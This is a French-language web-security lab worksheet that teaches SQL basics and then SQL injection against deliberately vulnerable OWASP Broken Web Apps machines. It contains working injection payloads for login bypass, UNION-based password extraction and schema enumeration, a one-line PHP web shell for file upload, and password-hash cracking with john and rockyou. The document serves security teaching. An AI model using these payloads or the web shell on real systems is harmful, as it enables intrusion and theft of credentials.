---
title: "Sécurité Web 1"
author: [Olivier LASNE]
subject: "Markdown"
keywords: [Sécuirté Web]
subtitle: ""
lang: "fr"
titlepage: true
...

# Sécurité Web

Pour ce TP nous utiliserons la machine __OWASP Broken Web Apps__ que vous avez déjà. Et l'iso __"From SLQi to Shell"__ que vous pouvez télécharger ici :

__[https://pentesterlab.com/exercises/from_sqli_to_shell/iso](https://pentesterlab.com/exercises/from_sqli_to_shell/iso)__

## Rappel SQL

SQL est un langage de requêtes de base de données.

Vous pouvez vous connecter en SSH à votre VM OWASP Broken Web Apps en SSH. `root/owaspbwa`.

`ssh root@192.168.56.101` (remplacer avec l'IP de la machine)

On peut y lancer MySQL avec la commande suivante :
`mysql -u root -powaspbwa`

Cela lance un shell MySQL. On obtient de l'aide avec la command `help` ou `\h`.
```
mysql> help

For information about MySQL products and services, visit:
   http://www.mysql.com/
For developer information, including the MySQL Reference Manual, visit:
   http://dev.mysql.com/
To buy MySQL Enterprise support, training, or other products, visit:
   https://shop.mysql.com/

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.

For server side help, type 'help contents'
```

On peut voir les bases de données avec la commande `show databases;`

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| .svn               |
| bricks             |
| bwapp              |
| citizens           |
| cryptomg           |
| dvwa               |
| gallery2           |
| getboo             |
| ghost              |
| gtd-php            |
| hex                |
| isp                |
| joomla             |
| mutillidae         |
| mysql              |
| nowasp             |
| orangehrm          |
| personalblog       |
| peruggia           |
| phpbb              |
| phpmyadmin         |
| proxy              |
| rentnet            |
| sqlol              |
| tikiwiki           |
| vicnum             |
| wackopicko         |
| wavsepdb           |
| webcal             |
| webgoat_coins      |
| wordpress          |
| wraithlogin        |
| yazd               |
+--------------------+
34 rows in set (0.00 sec)
```

On selectionne une base avec la commande __`use`__ :

```
mysql> use peruggia;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

On peut ensuite lister les tables avec la commande __`show tables;`__ :
```
mysql> show tables;
+--------------------+
| Tables_in_peruggia |
+--------------------+
| picdata            |
| users              |
+--------------------+
2 rows in set (0.00 sec)
```

__/!\ Les commandes `show` et `help` sont des commandes du SHELL MySQL. Il ne s'agit pas de requêtes SQL valides.__

On peut selectionner l'ensemble des champs d'un tables avec la requête `SELECT * FROM nom_de_la_table`.\
Le caractère `*` signifie _tout les champs_.

```
mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| ID | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | user     | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```

On peut selectionner un seulement certains champs, en les listants séparés par des virgules.
```
mysql> SELECT ID, username FROM users;
+----+----------+
| ID | username |
+----+----------+
|  1 | admin    |
|  2 | user     |
+----+----------+
2 rows in set (0.00 sec)
```

Note : il n'est pas nécessaire de mettre `SELECT` et `FROM` en majuscule. Néanmoins il s'agit de la convention prise dans la plupart des cas de façon à distinguer les _champs_ des _opérateurs_.

On peut utiliser le mot-clé `WHERE` pour filtrer les éléments sélectionnés.

```
mysql> SELECT password FROM users WHERE username = 'admin';
+----------------------------------+
| password                         |
+----------------------------------+
| 21232f297a57a5a743894a0e4a801fc3 |
+----------------------------------+
1 row in set (0.00 sec)
```

__Exercice :__ Selectionner le nom de l'utilisateur avec l'ID 2.

__Exercice 2:__ Dans la base de données _sqlol_. Faire une requête qui trouve si l'utilisateur avec l'_id_ 2 est admin. Le résultat de la requête doit donner un _0_ ou un _1_.

Solution : `SELECT isadmin FROM users WHERE id=2;`

On peut utiliser l'opérateur __`AND`__ pour préciser plusieurs conditions.

```
mysql> SELECT * FROM users WHERE id=1 AND username='admin';
+----+----------+----------------------------------+
| ID | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 21232f297a57a5a743894a0e4a801fc3 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

__Exercice :__ Dans la table _accounts_ de la base de données _nowasp_. Faire une requête qui authentifie un utilisateur c'est à dire :

* Renvoie des données si le nom d'utilisateur et le mot de passe sont bons (et correspondent au même utilisateur).
* Ne renvoie pas de données, si le couple utilisateur mot de passe n'est pas valide.

Pour cela, faire une requête _WHERE_ et _AND_ qui vérifie à la fois le nom d'utilisateur et le mot de passe.

Solution :\
`SELECT * FROM accounts WHERE username='adrian' AND password='somepassword';`

# Injection SQL

Si les données sont passées tels quel à l'application, on peut "s'échapper" des données pour modifier la requête.

En MySQL, "`-- `" signifie "la suite est un commentaire. __/!\\ Attention à l'espace après le `--`.__

Ainsi, si on rentre comme nom d'utilisateur _`admin';-- `.

La requête `SELECT * FROM accounts WHERE username=$username AND password=$password;`

```
SELECT * FROM accounts WHERE username='admin';-- ' AND password='';
```

Ce qu'il y a après le "`-- `" étant considérer comme un commentaire, MySQL interprète le requête comme 
```
SELECT * FROM accounts WHERE username='admin';
```

## Injecter sans connaître d'utilisateur

Si on ne connait pas de nom d'utilisateur, on peut utiliser la syntaxe `xxx' OR '1'='1'; -- ` pour créer une requête qui soit toujours vrai.

Injecter sans connaitre un utilisateur : `nimp' OR '1'='1';-- `


# Injection SQL : récupération de données avec UNION

On va chercher à utiliser l'opérateur UNION pour extraire des données de la base SQL.

## Déterminer le nombre de colonnes

Prennons l'exemple de OWASP Bircks content 1.

L'URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1`.

Effectue la requête :
```
SELECT * FROM users WHERE idusers=1 LIMIT 1
```

------------------------

On utilise l'opérateur `ORDER BY` pour déterminer le nombre de colonnes.

`http://192.168.56.101/owaspbricks/content-1/index.php?id=1+ORDER+BY+8` est valide, et correpond à la requête SQL

```
SELECT * FROM users WHERE idusers=1 ORDER BY 8 LIMIT 1;
```

```
+---------+------+-------------------+----------+---
| idusers | name | email             | password |
+---------+------+-------------------+----------+--- ...
|       1 | tom  | tom@getmantra.com | tom      |
+---------+------+-------------------+----------+---
```

Néanmoins, dès que l'on dépasse le nombre de colonnes avec `ORDER BY 9`, l'application renvoie une erreur.

![Injection avec un ORDER BY supérieur au nombre de colonnes de la requête](./images/order_by_9.png)

On en déduit donc que la __réponse à la requête SQL__ effectué par l'application ne contient que __8 colonnes__.

## Création d'une requête avec UNION

Maintenant que l'on connait le nombre de colonnes de la requête SQL, on peut insérer une requête avec `UNION` pour extraire des données de la base.

Comme la réponse contient 8 colonnes, on insère un union avec 8 `NULL`. On ajoute également le fameux __`;-- `__ pour commenter la fin de la requête.

L'URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- `.

Ce qui donne la requête :
```
SELECT * FROM users WHERE idusers=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;--  LIMIT 1;
```

```
+---------+------+-------------------+----------+---------------+--
| idusers | name | email             | password | ua            | r
+---------+------+-------------------+----------+---------------+--
|       1 | tom  | tom@getmantra.com | tom      | Block_Browser |  
|    NULL | NULL | NULL              | NULL     | NULL          | N
+---------+------+-------------------+----------+---------------+--
```

L'application n'affiche malgré tout que la première ligne. Nos `NULL` ne sont donc pas affichés.\
 Néanmoins, l'absence de message d'erreur nous permet de déduire que nous avons bien le bon nombre de colonnes.

![La réponse ne change pas avec une simple injection UNION SELECT NULL,...](images/select_union.png)

## Utilisation de LIMIT 1,1

L'application n'affichant que la 1ère ligne. On peut utiliser l'opérateur `LIMIT 1,1` après notre `UNION SELECT NULL,NULL,NULL,...` pour que l'application affiche notre requête.

L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+LIMIT+1,1;--`

Correspond à la requête:
```
SQL Query: SELECT * FROM users WHERE idusers=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL LIMIT 1,1;-- LIMIT 1
```

```
+---------+------+-------+----------+------+------+------+------+
| idusers | name | email | password | ua   | ref  | host | lang |
+---------+------+-------+----------+------+------+------+------+
|    NULL | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
+---------+------+-------+----------+------+------+------+------+
```

L'application n'affiche plus les "User ID: 1" et autres données de la requête initiale (avant le `UNION`). On a donc bien pris le contrôle de ce qui est affiché avec l'opérateur `LIMIT 1,1`.

![L'application affiche nos NULL,NULL,NULL,... c'est à dire rien !](images/select_limit_nulls.png)


## Afficher des données

On a 8 colonnes dans notre requête, mais l'application n'affiche que 3 champs. On va donc chercher à savoir quels sont les champs affichés par l'application.\
Pour cela, on remplace, certains de nos `NULL` par du texte entre guillemets `'aaaaa'`. Si on voit un `aaaa` dans la page affichée. C'est que l'on peut récupérer des données sur ce champs.

Comme on a de la chance, dès notre 1er champ, notre 'aaaaa' est réfléchit.

L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+%27aaaa%27,NULL,NULL,NULL,NULL,NULL,NULL,NULL+LIMIT+1,1;-- `

Donne la requête SQL
```
SELECT * FROM users WHERE idusers=1 UNION SELECT 'aaaa',NULL,NULL,NULL,NULL,NULL,NULL,NULL LIMIT 1,1;-- LIMIT 1
```

\newpage

```
+---------+------+-------+----------+------+------+------+------+
| idusers | name | email | password | ua   | ref  | host | lang |
+---------+------+-------+----------+------+------+------+------+
| aaaa    | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
+---------+------+-------+----------+------+------+------+------+
```

La page affichée montre bien notre `'aaaa'`.

![Nos 'aaaa' sont bien réfléchis dans la réponse](images/aaaa.png)

## Extraction de données de la base

Maintenant que l'on voit où l'on peut afficher des résultat de la requête dans la page web. On peut extraire des données de la base.

On remplace notre 'aaaa' par le nom d'une colonne comme `password` et on ajoute la table dans laquelle faire la recherche avec `FROM users`.

L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+password,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+users+LIMIT+1,1;--`

donne la requête SQL :
```
SELECT * FROM users WHERE idusers=1 UNION SELECT password,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users LIMIT 1,1;-- LIMIT 1
```

```
+---------+------+-------+----------+------+------+------+------+
| idusers | name | email | password | ua   | ref  | host | lang |
+---------+------+-------+----------+------+------+------+------+
| admin   | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
+---------+------+-------+----------+------+------+------+------+
```

La page affiche bien le mot de passe de du 1er utilisateur de la base.

![Le mot de passe de admin est admin](images/union_admin.png)

On peut ensuite jouer sur le `LIMIT ` pour afficher d'autres lignes.\
Par exemple `LIMIT 4,1` affiche le mot de passe du 4ème utilisateur.

URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+password,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+users+LIMIT+4,1;-- `

![Requête avec LIMIT 4,1 qui affiche donc la 4ème ligne de la table _users_](images/limit4-1.png)

Félicitations, vous venez d'extraire des mot de passe d'une base de données en exploitant une injection SQL avec l'opérateur `UNION`.

\newpage
## Explication pour content 2 

Même chose que pour l'exercice précédent sauf, qu'il est nécessaire d'ajouter un `'` après le texte pour réaliser l'injection.

URL : `http://192.168.56.101/owaspbricks/content-2/index.php?user=harry%27+ORDER+BY+8;--+`

Notez le "`+`" après le "`--`". Il s'agit d'un espace "` `" encodé en encodage URL.

Requête SQL: 
```
SELECT * FROM users WHERE name='harry' ORDER BY 8;-- '
```

```
+---------+-------+---------------------+---------------
| idusers | name  | email               | password      
+---------+-------+---------------------+--------------- ...
|       3 | harry | harry@getmantra.com | 5f4dcc3b5aa765
+---------+-------+---------------------+---------------

```

La suite est identique à l'exercice content1. On laissera jute le ```'``` en plus dans les requêtes.

\newpage

# Exploiter une injection SQL lorsqu'on ne connait pas le nom des tables et colonnes

Dans certains cas, on arrive à deviner le nom des tables et des colonnes. Dans le cas de `SELECT username, password FROM users`, on a des noms assez classiques.\
Mais que faire si on arrive pas à deviner ces identifiants, où que l'on souhaite extraire d'autres données de la base.

La méthode ci-dessous sera illustrée avec l'exercice __content-3 de OWASP Bricks__.

# Trouver la version de la base de données

Mettons que l'on a une injection avec UNION où l'on arrive à les résultats de notre requête.

![Notre 'aaaa' est réfléchit dans une injection avec UNION](images/content3-null.png)

On va chercher à identifier la base de donnée utilisée par l'application web. La syntaxe qui donne la version est différente en fonction de la base de donnée.

| Database type | Query |
|---|---|
Microsoft, MySQL  | SELECT @@version
Oracle            | SELECT * FROM v$version
PostgreSQL        | SELECT version()

On pourra donc utiliser un `UNION SELECT @@version` pour tester s'il s'agit d'une DB MySQL ou Microsoft.

![Identification de la version](images/identify_version.png)

Le fait que `@@version` fonctionne nous indique qu'il s'agit soit d'une base de données _MySQL_, soit d'une base de données _Microsoft_ (_MsSQL_).\
Étant donné que le système indique Ubuntu dans `5.1.41-3ubuntu12.6-log`. On conclut qu'il s'agit d'un MySQL.

Les étapes suivantes sont différentes en fonction de la base de donnée. Nous allons ici faire le cas d'une base de données __MySQL__ (cas le plus courant).\
Vous pouvez aller voir les sites suivants pour plus de détail sur comment identifier les tables et colonnes sur d'autres types de base de données :

* [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

Les étapes suivantes sont basées sur [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema)

## Lister les bases de données

MySQL a une base de données spéciale qui contient le nom des _bases de données_, _tables_, et _colonnes_ des tables.\
En faisant des requête sur cette dernière on peut récupérer toutes ces informations.

Lister les bases de données gérées par MySQL se fait avec le requête suivante :

```
SELECT group_concat(0x7c,schema_name,0x7c) FROM information_schema.schemata;
```

Dans une injection SQL avec un `UNION`, cela donne :

![Récupération des bases de données avec UNION](images/r%C3%A9cup%C3%A9ration_des_bdd.png)

Soit l'injection SQL suivante :
```
username=tom'+UNION+SELECT+NULL,NULL,group_concat(0x7c,schema_name,0x7c),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.schemata+LIMIT+1,1;--+&submit=Submit
```

## Lister les tables

De la même manière, une fois que l'on a identifier une base de donnée, on peut en lister les tables.\
Ici, la base qui nous intéresse est `bricks`.

Lister les tables se fait avec la requête SQL suivante :
```
SELECT group_concat(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema='nom_de_la_bdd';
```

![Récupération des Tables](images/list_tables.png)

Soit l'injection SQL suivante :
```
username=tom'+UNION+SELECT+NULL,NULL,group_concat(0x7c,table_name,0x7c),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema='bricks'+LIMIT+1,1;--+&submit=Submit
```

La base de données `bricks` ne contient ici qu'une seule table : `users`.

## Lister les colonnes

Une fois que la table est connue, on peut lister les colonnes de la table.
Ici, la table visée est `users` de la base de donnée `bricks`.

Lister les tables se fait avec la requête SQL suivante :
```
SELECT group_concat(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name='nom_de_la_table';
```

Ici, il y a plusieurs tables `users`, sur différentes bases de données. On va donc préciser le nom de la base de donnée dans notre requête.

```
SELECT group_concat(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name='nom_de_la_table' AND table_schema='nom_de_la_bdd';
```

![Récurération des colonnes d'une Table avec UNION](images/r%C3%A9cup_colonnes.png)

Soit, l'injection SQL suivante :

```
username=tom'+UNION+SELECT+NULL,NULL,group_concat(0x7c,column_name,0x7c),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'+AND+table_schema='bricks'+LIMIT+1,1;--+&submit=Submit
```

Une fois les tables et colonnes identifiées. On peut récupérer des données comme vu précédement en insérant un `SELECT nom_de_colonne FROM table`.

\newpage

# Upload de fichier

Fichier shell.php: 

```php
<?php
    system($_REQUEST['cmd']);
?>
```

# Casser un mot de passe

Une fois que l'on a récupérer un hash de mot de passe, comme le mot de passe suivant `8efe310f9ab3efeae8d410a8e0166eb2`. On va tenter de le casser pour retrouver le clair.

## Identifier le hash

On peut utiliser un outil  tel que `hash-identifier` (installé sur kali par défaut) pour identifier le type du hash.

```bash
$ hash-identifier                                                                                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 8efe310f9ab3efeae8d410a8e0166eb2

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```

Il s'agit donc probalement d'un hash md5.

## Casser le hash avec john the ripper

Pour tenter de casser un hash, il nous faut un outil tel que __`john`__, et une liste de mot de passe.\
Une liste commune contenant de nombreux mot de passe est __rockyou__, qui est présente sur kali par défaut.

Pour extraire rockyou, faîtes la commande suivante : `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.

On écrit notre hash dans un fichier admin.hash :

```bash
echo 8efe310f9ab3efeae8d410a8e0166eb2 > admin.hash
```
Puis on peut essayer de le casser en lancant `john` avec les options suivantes :

```bash
$ john admin.hash --rule=best64 --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status

P4ssw0rd         (?)

1g 0:00:00:01 DONE (2021-05-20 14:24) 0.9900g/s 434186p/s 434186c/s 434186C/s PHONE..LASHUN
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Pour revoir le mot de passe on peut faire la commande suivante :

```bash
john admin.hash --show --format=Raw-MD5
```